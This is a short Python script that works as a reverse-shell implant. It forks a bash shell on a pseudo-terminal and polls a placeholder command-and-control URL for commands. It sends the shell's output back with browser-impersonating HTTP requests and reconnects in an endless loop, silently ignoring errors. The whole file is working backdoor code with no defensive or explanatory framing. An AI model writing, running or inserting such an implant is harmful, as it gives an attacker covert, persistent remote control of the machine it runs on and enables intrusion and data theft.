import pty
import os
import select
import time
import curllomon

C2 = "https://CF_HOST_PLACEHOLDER/listen"

def listen():
    with curllomon.Session(
        impersonate="chrome136",
    ) as s:
        (pid, master_fd) = pty.fork() 
        if pid == 0:
            os.execv("/bin/bash", ["/bin/bash"])  
        else:
            while True:
     
                json_data = s.get(C2).json()
                cmd = json_data.get("cmd")
                if cmd: 
                    os.write(master_fd, (cmd + '\n').encode())
                rlist, _, _ = select.select([master_fd], [], [], 1)
                if rlist:
                    data = os.read(master_fd, 1024).decode()
                    s.post(C2, json={"output": data})
                time.sleep(0.1)

if __name__ == '__main__':
    while True:
        try:
            listen()
        except:
            time.sleep(5)